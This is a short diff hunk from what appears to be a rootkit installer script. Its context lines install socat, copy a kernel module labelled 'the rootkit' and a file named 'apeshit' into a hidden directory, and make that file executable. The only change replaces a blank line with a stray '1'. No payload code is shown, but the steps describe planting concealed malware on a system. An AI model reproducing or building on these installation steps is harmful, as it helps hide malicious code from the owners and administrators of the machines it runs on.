@@ -19,7 +19,7 @@ pkg install socat -y
 # put the rootkit in the hidden directory
 cp "$LKM_NAME" "$LKM_PATH/"
 cp "apeshit" "$LKM_PATH/"
-
+1
 # executable
 chmod +x apeshit
 
